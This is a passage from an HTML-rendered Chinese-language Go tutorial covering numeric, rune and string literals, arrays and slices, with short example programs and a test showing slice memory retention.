<td align="left">32-bit unsigned integer (0 to 4294967295)</td>
</tr>
<tr>
<td align="left"><code>uint64</code></td>
<td align="left">64-bit unsigned integer (0 to 18446744073709551615)</td>
</tr>
<tr>
<td align="left"><code>uint</code></td>
<td align="left">32 or 64 bits unsigned integer (取决于实现)</td>
</tr>
<tr>
<td align="left"><code>uintptr</code></td>
<td align="left">an unsigned integer large enough to store the uninterpreted bits of a pointer value</td>
</tr>
<tr>
<td align="left"><code>int8</code></td>
<td align="left">8-bit signed integer (-128 to 127)</td>
</tr>
<tr>
<td align="left"><code>int16</code></td>
<td align="left">16-bit signed integer (-32768 to 32767)</td>
</tr>
<tr>
<td align="left"><code>int32 | rune</code></td>
<td align="left">32-bit signed integer (-2147483648 to 2147483647)</td>
</tr>
<tr>
<td align="left"><code>int64</code></td>
<td align="left">64-bit signed integer (-9223372036854775808 to 9223372036854775807)</td>
</tr>
<tr>
<td align="left"><code>int</code></td>
<td align="left">32 or 64 bits signed integer (取决于实现)</td>
</tr>
<tr>
<td align="left"><code>float32</code></td>
<td align="left">32-bit floating-point number (IEEE-754)</td>
</tr>
<tr>
<td align="left"><code>float64</code></td>
<td align="left">64-bit floating-point number (IEEE-754)</td>
</tr>
<tr>
<td align="left"><code>complex64</code></td>
<td align="left">complex number with float32 real and imaginary part</td>
</tr>
<tr>
<td align="left"><code>complex128</code></td>
<td align="left">complex number with float64 real and imaginary part</td>
</tr>
</tbody></table>
<h4 id="integer"><a href="#integer" class="headerlink" title="integer"></a>integer</h4><ul>
<li>整型常量要求能表示 32byte 大小的范围，通常不会溢出</li>
<li>整型常量支持二进制、八进制、十进制和十六进制表示</li>
<li><code>_</code>可以放到连续的数字之间，以增加可读性，但不影响字面值</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="number">12</span>, <span class="number">1</span>_2)                   <span class="comment">// 12 12 (decimal)</span></span><br><span class="line">    fmt.Println(<span class="number">0</span>b11, <span class="number">0</span>b11, <span class="number">0</span>b1_1)         <span class="comment">// 3 3 3 (binary)</span></span><br><span class="line">    fmt.Println(<span class="number">012</span>, <span class="number">0</span>_12, <span class="number">0</span>o12, <span class="number">0</span>o12)     <span class="comment">// 10 10 10 10 (octal)</span></span><br><span class="line">    fmt.Println(<span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x1</span>_2, <span class="number">0</span>x_1_2) <span class="comment">// 18 18 18 18 (hexadecimal)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="溢出（overflow）"><a href="#溢出（overflow）" class="headerlink" title="溢出（overflow）"></a>溢出（overflow）</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> a, b <span class="type">uint8</span> = math.MaxUint8, <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> c <span class="type">uint8</span> = a + b</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%T %v\n&quot;</span>, c, c) <span class="comment">// uint8 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> d <span class="type">uint16</span> = <span class="type">uint16</span>(a) + <span class="type">uint16</span>(b)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%T %v\n&quot;</span>, d, d) <span class="comment">// uint16 256</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="float"><a href="#float" class="headerlink" title="float"></a>float</h4><ul>
<li>浮点型常量的小数部分要求能表示 32byte 大小的范围，指数部分能表示 2byte 大小的范围，通常不会溢出</li>
<li>浮点型常量只支持十进制和十六进制表示</li>
<li><code>_</code>可以放到连续的数字之间，以增加可读性，但不影响字面值</li>
<li>科学计数法的指数部分，以 10 为底数时用<code>e</code>表示，以 2 为底数时用<code>p</code>表示<ul>
<li><code>1.23e+3 = 1.23 x 10^3 = 1230</code></li>
<li><code>0x1.8p+2 = (1+8/16)x2^2 = 6</code></li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="number">1.23</span>, <span class="number">1.230</span>, <span class="number">01.230</span>)                 <span class="comment">// 1.23 1.23 1.23 (decimal)</span></span><br><span class="line">    fmt.Println(<span class="number">1.</span>, <span class="number">.23</span>, <span class="number">.2</span>_3)                       <span class="comment">// 1 0.23 0.23 (decimal)</span></span><br><span class="line">    fmt.Println(<span class="number">1.e+0</span>, <span class="number">1.23e+0</span>, <span class="number">1.23e+1</span>, <span class="number">1.23e+3</span>)    <span class="comment">// 1 1.23 12.3 1230 (decimal)</span></span><br><span class="line">    fmt.Println(<span class="number">0x1</span>p<span class="number">-2</span>, <span class="number">0x1</span>p<span class="number">-1</span>, <span class="number">0x1</span>p0, <span class="number">0x1</span>p1, <span class="number">0x1</span>p2) <span class="comment">// 0.25 0.5 1 2 4 (hexadecimal)</span></span><br><span class="line">    fmt.Println(<span class="number">0x1</span><span class="number">.8</span>p+<span class="number">0</span>, <span class="number">0x1</span><span class="number">.8</span>p+<span class="number">1</span>, <span class="number">0x1</span><span class="number">.8</span>p+<span class="number">2</span>)        <span class="comment">// 1.5 3 6 (hexadecimal)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="imaginary"><a href="#imaginary" class="headerlink" title="imaginary"></a>imaginary</h4><ul>
<li>虚数支持 integer 和 float 的表示形式，后缀<code>i</code>表示</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="number">12i</span>, <span class="number">0</span>b11i, <span class="number">0</span>o12i, <span class="number">0x12i</span>)              <span class="comment">// 12i 3i 10i 18i</span></span><br><span class="line">    fmt.Println(<span class="number">1.23i</span>, <span class="number">1.i</span>, <span class="number">.23i</span>, <span class="number">1.23e+3i</span>, <span class="number">0x1</span><span class="number">.8</span>p+<span class="number">2i</span>) <span class="comment">// 1.23i 1i 0.23i 1230i 6i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="rune"><a href="#rune" class="headerlink" title="rune"></a>rune</h4><ul>
<li>字符字面量（literal）通过<code>&#39;&#39;</code>表示，支持八进制、十六进制、Unicode 码点、特殊转义字符的表示形式</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&#x27;\a&#x27;</span>, <span class="string">&#x27;\u0007&#x27;</span>) <span class="comment">// 7 7 (alert or bell)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\b&#x27;</span>, <span class="string">&#x27;\u0008&#x27;</span>) <span class="comment">// 8 8 (backspace)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\u0009&#x27;</span>) <span class="comment">// 9 9 (horizontal tab)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\u000A&#x27;</span>) <span class="comment">// 10 10 (line feed or newline)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\v&#x27;</span>, <span class="string">&#x27;\u000B&#x27;</span>) <span class="comment">// 11 11 (vertical tab)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\u000C&#x27;</span>) <span class="comment">// 12 12 (form feed)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\u000D&#x27;</span>) <span class="comment">// 13 13 (carriage return)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\u005C&#x27;</span>) <span class="comment">// 92 92 (backslash)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\u0027&#x27;</span>) <span class="comment">// 39 39 (single quote)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0022&#x27;</span>)  <span class="comment">// 34 34 (double quote)</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\377&#x27;</span>)         <span class="comment">// 255</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\xff&#x27;</span>)         <span class="comment">// 255</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\u00ff&#x27;</span>)       <span class="comment">// 255</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;\U000000ff&#x27;</span>)   <span class="comment">// 255</span></span><br><span class="line">    fmt.Println(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment">// 48 65 97</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><ul>
<li>字符串（string）是不可变的（immutable），长度通过内建函数<code>len()</code>获取<ul>
<li>拼接字符串应优先用<code>strings.Builder、bytes.Buffer或[]byte</code>，以避免不断创建新的字符串<ul>
<li><code>strings.Builder</code> 和 <code>bytes.Buffer</code> 底层都是 <code>[]byte</code> 数组</li>
</ul>
</li>
</ul>
</li>
<li>字符串的值可看成由<code>byte</code>组成的数组，通过索引可访问字符（<code>s[i]</code>），但是不允许对索引的字符取地址（<code>&amp;s[i]</code>）</li>
<li>字符串字面量（literal）通过<code>&quot;&quot;</code>或&#96;&#96;表示，同时支持混合字符常量</li>
</ul>
<div class="tabs" id="go-type-string"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-string-1">Basic</a></li><li class="tab"><a href="#go-type-string-2">Concat</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-string-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// variable</span></span><br><span class="line">    <span class="keyword">var</span> a <span class="type">string</span> = <span class="string">&quot;xyz&quot;</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %s %c %c\n&quot;</span>, <span class="built_in">len</span>(a), a, a[<span class="number">0</span>], a[<span class="number">2</span>]) <span class="comment">// 3 xyz x z</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// literal</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;ab&quot;</span>, <span class="string">`ab`</span>) <span class="comment">// ab ab</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;a\tb&quot;</span>, <span class="string">`a	b`</span>) <span class="comment">// a	b a	b</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;[\u00ff]&quot;</span>) <span class="comment">// [ÿ]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-string-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConcatByBuilder</span><span class="params">(s <span class="type">string</span>, n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> builder strings.Builder</span><br><span class="line">    builder.Grow(n * <span class="built_in">len</span>(s)) <span class="comment">// Preallocated memory</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        builder.WriteString(s)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> builder.String()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConcatByBuffer</span><span class="params">(s <span class="type">string</span>, n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    buf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        buf.WriteString(s)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.String()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConcatByByte</span><span class="params">(n <span class="type">int</span>, str <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        buf = <span class="built_in">append</span>(buf, str...)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(buf)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><ul>
<li>数组的赋值会拷贝所有的元素，因此函数参数中传递指针更有效率</li>
<li>数组的 length 作为数组类型（type）的一部分看待（固定长度）<ul>
<li><code>[10]int</code>和<code>[20]int</code>是不同的类型</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-type-array"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-array-1">Basic</a></li><li class="tab"><a href="#go-type-array-2">AsFuncParam</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-array-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Init</span></span><br><span class="line">    a := [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;                              <span class="comment">// array (显式size)</span></span><br><span class="line">    b := [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;                            <span class="comment">// array (隐式size)</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %d %T %v\n&quot;</span>, <span class="built_in">cap</span>(a), <span class="built_in">len</span>(a), a, a) <span class="comment">// 3 3 [3]int [1 2 3]</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %d %T %v\n&quot;</span>, <span class="built_in">cap</span>(b), <span class="built_in">len</span>(b), b, b) <span class="comment">// 3 3 [3]int [1 2 3]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ToSlice</span></span><br><span class="line">    <span class="keyword">var</span> c []<span class="type">int</span> = a[<span class="number">1</span>:<span class="number">3</span>]                              <span class="comment">// slice</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %d %T %v\n&quot;</span>, <span class="built_in">cap</span>(c), <span class="built_in">len</span>(c), c, c) <span class="comment">// 3 2 []int [2 3]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-array-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(a *[3]<span class="type">float64</span>)</span></span> (sum <span class="type">float64</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> *a &#123;</span><br><span class="line">        sum += v</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array := [...]<span class="type">float64</span>&#123;<span class="number">7.0</span>, <span class="number">8.5</span>, <span class="number">9.1</span>&#125;</span><br><span class="line">x := Sum(&amp;array)  <span class="comment">// Note the explicit address-of operator</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a>Slice</h3><ul>
<li>切片（slice）是对数组的更高维度的封装，以对序列号数据的操作提供更通用、强大且便利的接口<ul>
<li>单维度数组操作通常都是以 Slice 形式存在</li>
</ul>
</li>
<li>切片支持动态扩容，当底层 Array 大小不够用时，会重新分配 2 倍大小空间的 Array，然后将所有元素拷贝到新空间</li>
<li>切片的赋值并不会拷贝底层 Array，它们都指向同一个数组<ul>
<li>函数传参通过 Slice，也就类似于通过<code>*Array</code>，函数内外修改数组中的元素是相互影响的</li>
<li><strong>GC 陷阱</strong>：当底层数组占用的内存已经很大后，仍存在一小段切片在使用，那么这段很大的内存不会被释放</li>
</ul>
</li>
<li>切片类型的值只能转换为与其元素类型相同的切片类型，而不能转换为任何类型的切片<ul>
<li><code>[]int</code>不能直接传递给<code>[]any</code>（报错），可以先转换成<code>[]interface&#123;&#125;</code>后再传递给<code>[]any</code></li>
</ul>
</li>
</ul>
<div class="tabs" id="go-type-slice"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-slice-1">Basic</a></li><li class="tab"><a href="#go-type-slice-2">Transform</a></li><li class="tab"><a href="#go-type-slice-3">AppendImpl</a></li><li class="tab"><a href="#go-type-slice-4">GCProblem</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-slice-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// init</span></span><br><span class="line">    a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">    c := <span class="built_in">new</span>([<span class="number">5</span>]<span class="type">int</span>)[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %d %T %v\n&quot;</span>, <span class="built_in">cap</span>(a), <span class="built_in">len</span>(a), a, a) <span class="comment">// 3 3 []int [1 2 3]</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %d %T %v\n&quot;</span>, <span class="built_in">cap</span>(b), <span class="built_in">len</span>(b), b, b) <span class="comment">// 5 3 []int [0 0 0]</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d %d %T %v\n&quot;</span>, <span class="built_in">cap</span>(c), <span class="built_in">len</span>(c), c, c) <span class="comment">// 5 3 []int [0 0 0]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// modify</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">22</span></span><br><span class="line">    fmt.Println(a) <span class="comment">// [1 22 3]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// add</span></span><br><span class="line">    d := <span class="built_in">append</span>(a, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">    fmt.Println(a, d) <span class="comment">// [1 22 3] [1 22 3 4 5]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete (注意c和d共享同一个底层array)</span></span><br><span class="line">    c = <span class="built_in">append</span>(d[:<span class="number">1</span>], d[<span class="number">2</span>:]...)</span><br><span class="line">    fmt.Println(c, d) <span class="comment">// [1 3 4 5] [1 3 4 5 5]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// truncate</span></span><br><span class="line">    e := d[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line">    fmt.Println(e) <span class="comment">// [3 4 5]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy</span></span><br><span class="line">    <span class="built_in">copy</span>(b, a)</span><br><span class="line">    fmt.Println(a, b) <span class="comment">// [1 22 3] [1 22 3]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// spreading</span></span><br><span class="line">    f := []<span class="keyword">interface</span>&#123;&#125;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">    fmt.Println(f)    <span class="comment">// [1 2 3]</span></span><br><span class="line">    fmt.Println(f...) <span class="comment">// 1 2 3 (切片展开)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// traversal</span></span><br><span class="line">    <span class="keyword">for</span> i, v := <span class="keyword">range</span> a &#123;</span><br><span class="line">        fmt.Println(i, v) <span class="comment">// 0 1  1 22  2 3</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// isEmpty</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;slice is empty&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// isEqual</span></span><br><span class="line">    <span class="keyword">if</span> reflect.DeepEqual(a, b) &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d %v equal %d %v\n&quot;</span>, <span class="built_in">cap</span>(a), a, <span class="built_in">cap</span>(b), b) <span class="comment">// 3 [1 22 3] equal 5 [1 22 3]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-slice-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// SliceToArray</span></span><br><span class="line">    a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;      <span class="comment">// slice</span></span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="built_in">len</span>(a)) <span class="comment">// array</span></span><br><span class="line">    <span class="built_in">copy</span>(b, a)</span><br><span class="line">    fmt.Println(a, b) <span class="comment">// [1 2 3] [1 2 3]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ArrayToSlice</span></span><br><span class="line">    c := [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment">// array</span></span><br><span class="line">    d := c[:]            <span class="comment">// slice</span></span><br><span class="line">    fmt.Println(c, d)    <span class="comment">// [1 2 3] [1 2 3]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-slice-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Append</span><span class="params">(slice, data []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    l := <span class="built_in">len</span>(slice)</span><br><span class="line">    <span class="keyword">if</span> l + <span class="built_in">len</span>(data) &gt; <span class="built_in">cap</span>(slice) &#123;  <span class="comment">// reallocate</span></span><br><span class="line">        <span class="comment">// Allocate double what&#x27;s needed, for future growth.</span></span><br><span class="line">        newSlice := <span class="built_in">make</span>([]<span class="type">byte</span>, (l+<span class="built_in">len</span>(data))*<span class="number">2</span>)</span><br><span class="line">        <span class="comment">// The copy function is predeclared and works for any slice type.</span></span><br><span class="line">        <span class="built_in">copy</span>(newSlice, slice)</span><br><span class="line">        slice = newSlice</span><br><span class="line">    &#125;</span><br><span class="line">    slice = slice[<span class="number">0</span>:l+<span class="built_in">len</span>(data)]</span><br><span class="line">    <span class="built_in">copy</span>(slice[l:], data)</span><br><span class="line">    <span class="keyword">return</span> slice</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-slice-4"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/slice.go</span></span><br><span class="line"><span class="keyword">package</span> dep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LastNumsBySlice</span><span class="params">(origin []<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> origin[<span class="built_in">len</span>(origin)<span class="number">-2</span>:]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LastNumsByCopy</span><span class="params">(origin []<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    result := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">copy</span>(result, origin[<span class="built_in">len</span>(origin)<span class="number">-2</span>:])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dep/slice_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;example.com/dep&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init1MB</span><span class="params">()</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    n := <span class="number">128</span> * <span class="number">1024</span> <span class="comment">//1M in x64 machine</span></span><br><span class="line">    nums := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, n)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        nums = <span class="built_in">append</span>(nums, rand.Int())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printMem</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    t.Helper()</span><br><span class="line">    <span class="keyword">var</span> m runtime.MemStats</span><br><span class="line">    runtime.ReadMemStats(&amp;m)</span><br><span class="line">    t.Logf(<span class="string">&quot;%.2f MB&quot;</span>, <span class="type">float64</span>(m.Alloc)/<span class="number">1024.</span>/<span class="number">1024.</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testF</span><span class="params">(t *testing.T, f <span class="keyword">func</span>([]<span class="type">int</span>)</span></span> []<span class="type">int</span>) &#123;</span><br><span class="line">    t.Helper()</span><br><span class="line">    r := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">        origin := init1MB()</span><br><span class="line">        r = <span class="built_in">append</span>(r, f(origin))</span><br><span class="line">        <span class="comment">// runtime.GC() // (maybe)</span></span><br><span class="line">    &#125;</span><br><span class="line">    printMem(t)</span><br><span class="line">    _ = r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestLastNumsBySlice</span><span class="params">(t *testing.T)</span></span> &#123; testF(t, dep.LastNumsBySlice) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestLastNumsByCopy</span><span class="params">(t *testing.T)</span></span>  &#123; testF(t, dep.LastNumsByCopy) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$ go test -run=&quot;TestLast&quot; . -v</span></span><br><span class="line"><span class="comment">=== RUN   TestLastNumsBySlice slice_test.go:40: 100.12 MB</span></span><br><span class="line"><span class="comment">=== RUN   TestLastNumsByCopy slice_test.go:41: 2.13 MB</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="切片表达式（slice-expression）"><a href="#切片表达式（slice-expression）" class="headerlink" title="切片表达式（slice expression）"></a>切片表达式（slice expression）</h4><ul>
<li>简单的（Simple）<ul>
